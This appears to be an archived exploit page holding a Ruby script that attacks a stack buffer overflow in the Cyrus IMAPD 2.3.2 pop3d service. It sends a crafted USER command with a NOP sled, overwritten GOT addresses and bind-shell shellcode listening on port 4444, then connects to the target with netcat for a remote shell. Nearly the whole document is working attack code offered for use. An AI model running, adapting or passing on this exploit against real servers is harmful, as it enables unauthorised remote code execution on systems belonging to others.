<html><head><title>Cyrus IMAPD 2.3.2 (pop3d) Remote Buffer Overflow Exploit (2)</title></head><pre>#!/usr/bin/ruby
#
# cyrus-imapd pop3d exploit
# by bannedit
#
# 05/23/2006
#	This exploit takes advantage of a stack based overflow.
#	Once the stack corruption has occured it is possible
#	to overwrite a pointer which is later used for a memcpy
#	this gives us a write anything anywhere condition similar
#	to a format string vulnerability.
#	
#	I choose to overwrite the GOT table with my shellcode and
#	return to it. This defeats the VA random patch and possibly
#	other stack protection features.
#
#	tested on gentoo-sources linux 2.6.16



require 'socket'

#will add targets for other linux distros
targets = { 'linux 2.6' =&gt; '0x080fd318', 'linux 2.6 Hardened' =&gt; '', 'freebsd' =&gt; '' }


#metasploit bind shellcode by skape 84 bytes port 4444#

shellcode = 
&quot;\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96&quot;+
&quot;\x43\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56&quot;+
&quot;\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1&quot;+
&quot;\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0&quot;+
&quot;\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53&quot;+
&quot;\x89\xe1\xcd\x80&quot;


puts &quot;--[cyrus imapd pop3 popsubfolders exploit&quot;
puts &quot;----[by bannedit&quot;
puts &quot;-----------------------------------------&quot;

case ARGV.length 

when 0
	puts &quot;--- ./exploit [host] [options]&quot;
	exit

when 1
	sock = TCPSocket.new(ARGV[0], &quot;pop3&quot;)

when 2
	sock = TCPSocket.new(ARGV[0], &quot;pop3&quot;)
	ret = ARGV[1].hex

end

ret = (targets['linux 2.6'].hex) 

puts &quot;&lt;- &quot; + banner = sock.gets
puts &quot;-&gt; sending USER command&quot;
printf &quot; injecting shellcode: %d bytes\n&quot;, shellcode.length


#this alignment stuff should probably be cleaned up its kinda icky#

evil_buff = &quot;USER &quot; 
evil_buff &lt;&lt;&quot;\x90&quot; * 265 #(290 - shellcode.length)

evil_buff &lt;&lt; ([ret].pack('V')) * 2 #return address
evil_buff &lt;&lt;&quot;\x90&quot; * (250 - shellcode.length) 
evil_buff &lt;&lt; shellcode
evil_buff &lt;&lt;&quot;\x90&quot; * (29)
ret = ret - 277
evil_buff &lt;&lt; ([ret].pack('V')) * 4 #0x080fd204
evil_buff &lt;&lt;&quot;\r\n&quot;

sock.send(evil_buff, 0)

sleep 9
puts &quot; attempting to connect to #{ARGV[0]} port 4444&quot;

cmd = &quot;nc #{ARGV[0]} 4444&quot;
system(cmd)

sock.close

# milw0rm.com [2006-07-21]</pre></html>